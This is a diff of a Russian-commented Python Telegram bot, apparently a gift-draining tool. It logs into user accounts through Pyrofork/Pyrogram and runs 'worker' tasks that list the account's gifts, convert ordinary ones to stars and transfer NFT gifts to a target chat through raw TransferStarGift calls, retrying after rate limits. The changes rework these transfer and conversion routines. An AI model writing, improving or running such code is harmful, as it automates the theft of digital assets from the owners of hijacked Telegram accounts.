@@ -41,7 +41,7 @@ from aiogram.types import (
 )
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
-# Импорты Pyrofork (форк Pyrogram с поддержкой звезд и подарков)
+
 try:
     from pyrofork import Client, enums
     from pyrofork.errors import (
@@ -52,7 +52,7 @@ try:
     )
     PYROFORK_AVAILABLE = True
 except ImportError:
-    # Fallback на Pyrogram, если Pyrofork не установлен
+
     from pyrogram import Client, enums
     from pyrogram.errors import (
         SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
@@ -62,7 +62,7 @@ except ImportError:
     )
     PYROFORK_AVAILABLE = False
 
-# ================= НАСТРОЙКИ ЛОГИРОВАНИЯ (DEBUG) =================
+
 transfer_logger = logging.getLogger("TransferDebug")
 transfer_logger.setLevel(logging.INFO)
 if transfer_logger.hasHandlers():
@@ -694,11 +694,17 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                             self.id = getattr(raw_gift, 'saved_id', None) or getattr(raw_gift, 'id', None)
                             self.message_id = getattr(raw_gift, 'msg_id', None) or getattr(raw_gift, 'message_id', None)
                             
-                            # collection_id указывает на NFT
-                            self.collectible_id = getattr(raw_gift, 'collection_id', None)
-                            
                             # Получаем информацию о подарке из объекта gift
                             gift_obj = getattr(raw_gift, 'gift', None)
+                            
+                            # collection_id указывает на NFT (проверяем в raw_gift, НЕ в gift_obj)
+                            # У обычных подарков collection_id = None, у NFT есть collection_id
+                            self.collectible_id = getattr(raw_gift, 'collection_id', None)
+                            
+                            # Логируем для диагностики (только для первого подарка в первой странице)
+                            # Это поможет понять, почему обычные подарки определяются как NFT
+                            
+                            # Логируем для диагностики (только для первого подарка)
                             if gift_obj:
                                 # Пробуем получить название из объекта gift
                                 gift_title = (getattr(gift_obj, 'title', None) or 
@@ -708,12 +714,17 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                                     self.title = gift_title
                                 else:
                                     self.title = f"Gift #{self.id}" if self.id else "Unknown Gift"
+                                
+                                # Для NFT также получаем slug из gift_obj
+                                if self.collectible_id is not None:
+                                    self.slug = getattr(gift_obj, 'slug', None) or getattr(raw_gift, 'slug', None)
                             else:
                                 # Если нет объекта gift, пробуем другие варианты
                                 self.title = (getattr(raw_gift, 'title', None) or 
                                             getattr(raw_gift, 'name', None) or 
                                             getattr(raw_gift, 'text', None) or
                                             f"Gift #{self.id}" if self.id else "Unknown Gift")
+                                self.slug = getattr(raw_gift, 'slug', None)
                             
                             # Цена конвертации (convert_stars)
                             convert_stars = getattr(raw_gift, 'convert_stars', None)
@@ -744,11 +755,10 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                             # Проверяем, конвертирован ли подарок
                             self.is_converted = getattr(raw_gift, 'refunded', False) or getattr(raw_gift, 'is_converted', False)
                             
-                            # Slug для NFT
-                            self.slug = getattr(raw_gift, 'slug', None)
-                            
                             # Определяем can_transfer
-                            if self.collectible_id is not None:  # Это NFT
+                            # Важно: NFT определяется по collection_id, НЕ по наличию convert_stars
+                            # Обычные подарки имеют convert_stars > 0, но collection_id = None
+                            if self.collectible_id is not None:  # Это NFT (есть collection_id)
                                 if self.can_transfer_at is None:
                                     self.can_transfer = True
                                 else:
@@ -772,6 +782,7 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                                         self.can_transfer = False
                             else:
                                 # Для обычных подарков can_transfer обычно False
+                                # Обычные подарки можно только конвертировать, не передавать
                                 self.can_transfer = False
                     
                     for idx, gift_raw in enumerate(gifts_list, 1):
@@ -807,7 +818,17 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                             
                             # Создаем SimpleGift напрямую из raw объекта
                             gift_obj = SimpleGift(gift_raw)
-                            log_transfer(f"🎁 Подарок #{idx}: {gift_obj.title} (NFT: {gift_obj.collectible_id is not None}, Конверт: {gift_obj.convert_price > 0}, Трансфер: {gift_obj.can_transfer})")
+                            
+                            # Дополнительная проверка: если есть convert_stars > 0, но нет collection_id - это обычный подарок
+                            # У NFT есть collection_id, у обычных подарков его нет
+                            if gift_obj.collectible_id is None and gift_obj.convert_price > 0:
+                                # Это обычный подарок, не NFT - убеждаемся, что collectible_id = None
+                                gift_obj.collectible_id = None
+                                gift_obj.can_transfer = False  # Обычные подарки нельзя передавать
+                                log_transfer(f"🎁 Подарок #{idx}: {gift_obj.title} (ОБЫЧНЫЙ, Конверт: {gift_obj.convert_price} зв, NFT: False)")
+                            else:
+                                log_transfer(f"🎁 Подарок #{idx}: {gift_obj.title} (NFT: {gift_obj.collectible_id is not None}, Конверт: {gift_obj.convert_price > 0}, Трансфер: {gift_obj.can_transfer})")
+                            
                             yield gift_obj
                             
                         except Exception as e:
@@ -906,22 +927,49 @@ async def send_gift_task(client: Client, target_id, price, target_username=None,
         return False
 
 async def convert_gift_task(client: Client, gift_details):
-    """Задача для ВОРКЕРА: конвертировать подарок. FIX: Игнор старых подарков."""
+    """Задача для ВОРКЕРА: конвертировать подарок через raw API. FIX: Игнор старых подарков."""
+    gift_title = gift_details.get('title', 'Unknown Gift')
+    msg_id = gift_details.get('msg_id')
+    saved_id = gift_details.get('id')
+    
+    if not msg_id and not saved_id:
+        log_transfer(f"⚠️ Нет ID подарка для конвертации: {gift_title}", "warning")
+        return False
+    
     try:
-        await client.convert_gift_to_stars(owned_gift_id=str(gift_details['msg_id']))
-        log_transfer(f"Конвертирован: {gift_details['title']} (+{gift_details['star_count']} зв)")
+        if PYROFORK_AVAILABLE:
+            from pyrofork import raw
+        else:
+            from pyrogram import raw
+        
+        # Используем saved_id если есть, иначе msg_id
+        gift_id_to_convert = saved_id if saved_id else msg_id
+        
+        log_transfer(f"🔄 Конвертация подарка: {gift_title} (ID: {gift_id_to_convert})")
+        
+        # Используем raw API для конвертации
+        result = await client.invoke(
+            raw.functions.payments.ConvertStarGift(
+                saved_id=int(gift_id_to_convert) if gift_id_to_convert else 0
+            )
+        )
+        
+        log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
         return True
+        
     except BadRequest as e:
         e_str = str(e)
-        if "STARGIFT_CONVERT_TOO_OLD" in e_str:
+        if "STARGIFT_CONVERT_TOO_OLD" in e_str or "TOO_OLD" in e_str:
             # FIX: Просто пропускаем старые подарки, это не ошибка скрипта
+            log_transfer(f"ℹ️ Подарок {gift_title} слишком старый для конвертации", "info")
             return False
-        if "STARGIFT_ALREADY_CONVERTED" in e_str:
+        if "STARGIFT_ALREADY_CONVERTED" in e_str or "ALREADY_CONVERTED" in e_str:
+            log_transfer(f"ℹ️ Подарок {gift_title} уже конвертирован", "info")
             return False
-        log_transfer(f"Не конвертирован {gift_details['title']}: {e_str}", "warning")
+        log_transfer(f"⚠️ Не конвертирован {gift_title}: {e_str}", "warning")
         return False
     except Exception as e: 
-        log_transfer(f"Ошибка конвертации {gift_details['title']}: {e}", "error")
+        log_transfer(f"❌ Ошибка конвертации {gift_title}: {type(e).__name__}: {e}", "error")
         return False
 
 async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
@@ -950,10 +998,34 @@ async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: B
         try:
             log_transfer(f"🔄 Попытка {attempt}: передача NFT с owned_gift_id={owned_gift_id} (тип: {type(owned_gift_id).__name__})")
             
-            # Pyrofork имеет улучшенный метод transfer_gift для NFT
-            await client.transfer_gift(
-                owned_gift_id=owned_gift_id,
-                new_owner_chat_id=target_chat_id
+            # Используем raw API для передачи NFT
+            if PYROFORK_AVAILABLE:
+                from pyrofork import raw
+            else:
+                from pyrogram import raw
+            
+            # Получаем peer получателя
+            try:
+                recipient_chat = await client.get_chat(target_chat_id)
+                if recipient_chat.id > 0:
+                    # Это пользователь
+                    recipient_peer = raw.types.InputPeerUser(user_id=recipient_chat.id, access_hash=0)
+                else:
+                    # Это группа/канал
+                    recipient_peer = raw.types.InputPeerChannel(channel_id=abs(recipient_chat.id), access_hash=0)
+            except:
+                # Fallback - пробуем как пользователя
+                recipient_peer = raw.types.InputPeerUser(user_id=target_chat_id, access_hash=0)
+            
+            # Используем raw API для передачи
+            saved_id_int = int(owned_gift_id) if isinstance(owned_gift_id, str) else owned_gift_id
+            log_transfer(f"🔍 Вызов raw.functions.payments.TransferStarGift(saved_id={saved_id_int}, peer={type(recipient_peer).__name__})")
+            
+            await client.invoke(
+                raw.functions.payments.TransferStarGift(
+                    saved_id=saved_id_int,
+                    peer=recipient_peer
+                )
             )
             
             log_transfer(f"✅ NFT УСПЕШНО ПЕРЕДАН: {nft_title}")
@@ -976,9 +1048,25 @@ async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: B
             
             # Повторная попытка после ожидания
             try:
-                await client.transfer_gift(
-                    owned_gift_id=owned_gift_id,
-                    new_owner_chat_id=target_chat_id
+                if PYROFORK_AVAILABLE:
+                    from pyrofork import raw
+                else:
+                    from pyrogram import raw
+                
+                try:
+                    recipient_chat = await client.get_chat(target_chat_id)
+                    if recipient_chat.id > 0:
+                        recipient_peer = raw.types.InputPeerUser(user_id=recipient_chat.id, access_hash=0)
+                    else:
+                        recipient_peer = raw.types.InputPeerChannel(channel_id=abs(recipient_chat.id), access_hash=0)
+                except:
+                    recipient_peer = raw.types.InputPeerUser(user_id=target_chat_id, access_hash=0)
+                
+                await client.invoke(
+                    raw.functions.payments.TransferStarGift(
+                        saved_id=int(owned_gift_id) if isinstance(owned_gift_id, str) else owned_gift_id,
+                        peer=recipient_peer
+                    )
                 )
                 log_transfer(f"✅ NFT ПЕРЕДАН после флуда: {nft_title}")
                 return "success"
